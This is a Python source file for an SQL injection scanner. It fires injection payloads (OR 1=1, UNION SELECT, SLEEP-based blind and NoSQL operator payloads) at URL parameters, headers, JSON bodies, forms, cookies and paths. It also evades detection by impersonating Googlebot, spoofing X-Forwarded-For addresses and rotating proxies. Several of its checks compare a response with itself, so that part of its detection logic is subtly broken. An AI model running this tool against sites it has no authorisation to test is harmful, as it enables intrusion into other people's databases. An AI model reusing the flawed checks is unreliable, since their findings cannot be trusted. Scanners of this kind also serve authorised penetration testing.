import requests
import time
import re
import random
import difflib
from urllib.parse import urlparse, parse_qs, quote, urlencode
from config import SCAN_CONFIG

class SQLiScanner:
    def __init__(self, proxies=None):
        self.config = SCAN_CONFIG
        self.session = requests.Session()
        self.proxies = proxies or []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
        ]
        self._configure_session()

    def _configure_session(self):
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br'
        })
        self.session.verify = False
        self.session.max_redirects = 3

    def scan_url(self, url):
        results = []
        parsed = urlparse(url)
        self._test_header_injection(url, results)
        self._test_json_params(url, results)
        self._test_post_forms(url, results)
        self._test_cookies(url, results)
        self._test_path_injection(url, results)

        base_url = self._prepare_base_url(url)
        normal_res = self._get_normal_response(base_url)

        if normal_res:
            params = self._get_parameters_to_test(parsed)
            for param in params:
                self._test_parameter(base_url, param, normal_res, results)

        return results

    def _execute_request(self, url, method='GET', headers=None, json=None, data=None, cookies=None, retries=3):
        try:
            kwargs = {
                'timeout': self.config["TIMEOUT"],
                'headers': headers or self.session.headers,
                'cookies': cookies,
                'verify': False
            }
            if json:
                kwargs['json'] = json
            if data:
                kwargs['data'] = data
            if self.proxies:
                kwargs['proxies'] = {'http': random.choice(self.proxies)}

            if method.upper() == 'GET':
                response = self.session.get(url, **kwargs)
            else:
                response = self.session.post(url, **kwargs)

            return response
        except requests.exceptions.RequestException:
            if retries > 0:
                time.sleep(self.config["RETRY_DELAY"])
                return self._execute_request(url, method, headers, json, data, cookies, retries - 1)
            raise

    def _check_response_for_errors(self, response, normal_response):
        patterns = self.config["ERROR_PATTERNS"]
        if any(re.search(p, response.text) for p in patterns):
            return True
        similarity = difflib.SequenceMatcher(None, normal_response.text, response.text).ratio()
        return similarity < 0.9

    def _test_parameter(self, base_url, param, normal_res, results):
        baseline_start = time.time()
        self._execute_request(base_url)
        baseline_time = time.time() - baseline_start

        for payload in self.config["BLIND_PAYLOADS"]["mysql"]:
            test_url = f"{base_url}&{param}={quote(payload)}"
            start = time.time()
            res = self._execute_request(test_url)
            elapsed = time.time() - start

            if elapsed > (baseline_time + self.config["DELAY_THRESHOLD"]):
                results.append({
                    'type': 'Blind SQLi (Time-Based)',
                    'param': param,
                    'payload': payload,
                    'evidence': f"Delay: {elapsed:.2f}s",
                    'severity': 'Critical'
                })
            elif self._check_response_for_errors(res, normal_res):
                results.append({
                    'type': 'Classic SQLi',
                    'param': param,
                    'payload': payload,
                    'evidence': res.text[:200],
                    'severity': 'High'
                })

    def _test_header_injection(self, url, results):
        headers_to_test = {
            'User-Agent': ["' OR 1=1 --"],
            'Referer': ["http://evil.com' AND 1=1 --"],
            'X-Forwarded-For': ["1.1.1.1' OR SLEEP(2)#"]
        }
        for header, payloads in headers_to_test.items():
            for payload in payloads:
                try:
                    temp_headers = self.session.headers.copy()
                    temp_headers[header] = payload
                    res = self._execute_request(url, headers=temp_headers)
                    if self._check_response_for_errors(res, res):
                        results.append({
                            'type': 'Header Injection',
                            'header': header,
                            'payload': payload,
                            'evidence': "Error/difference detected"
                        })
                except Exception:
                    continue

    def _test_json_params(self, url, results):
        json_payloads = [
            {'id': "1' OR 1=1--"},
            {'filter': "{'$where': '1=1'}"},
            {'query': "{\"$gt\": \"\"}"}
        ]
        for payload in json_payloads:
            try:
                res = self._execute_request(url, method='POST', json=payload)
                if self._check_response_for_errors(res, res):
                    results.append({
                        'type': 'JSON Injection',
                        'payload': str(payload),
                        'evidence': "Error/difference detected"
                    })
            except Exception:
                continue

    def _test_post_forms(self, url, results):
        post_data = {
            'username': ["' OR '1'='1", "' UNION SELECT @@version --"],
            'password': ["' OR SLEEP(2)#"]
        }
        for field, payloads in post_data.items():
            for payload in payloads:
                try:
                    data = {field: payload}
                    res = self._execute_request(url, method='POST', data=data)
                    if self._check_response_for_errors(res, res):
                        results.append({
                            'type': 'POST Form Injection',
                            'field': field,
                            'payload': payload,
                            'evidence': "Error/difference detected"
                        })
                except Exception:
                    continue

    def _test_cookies(self, url, results):
        test_cookies = {
            'session_id': ["' OR 1=1 --"],
            'user_id': ["' UNION SELECT @@version --"]
        }
        for cookie, payloads in test_cookies.items():
            for payload in payloads:
                try:
                    cookies = {cookie: payload}
                    res = self._execute_request(url, cookies=cookies)
                    if self._check_response_for_errors(res, res):
                        results.append({
                            'type': 'Cookie Injection',
                            'cookie': cookie,
                            'payload': payload,
                            'evidence': "Error/difference detected"
                        })
                except Exception:
                    continue

    def _test_path_injection(self, url, results):
        parsed = urlparse(url)
        for payload in self.config["PATH_PAYLOADS"]:
            test_url = f"{parsed.scheme}://{parsed.netloc}{payload}"
            try:
                res = self._execute_request(test_url)
                if self._check_response_for_errors(res, res):
                    results.append({
                        'type': 'Path Injection',
                        'payload': payload,
                        'evidence': "Error/difference detected"
                    })
            except Exception:
                continue

    def _prepare_base_url(self, url):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query.update({param: '1' for param in self.config["DEFAULT_PARAMS"]})
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(query, doseq=True)}"

    def _get_normal_response(self, url):
        return self._execute_request(url)

    def _get_parameters_to_test(self, parsed):
        existing = parse_qs(parsed.query).keys()
        return set(existing).union(self.config["DEFAULT_PARAMS"])

def get_scanner(proxies=None):
    return SQLiScanner(proxies)
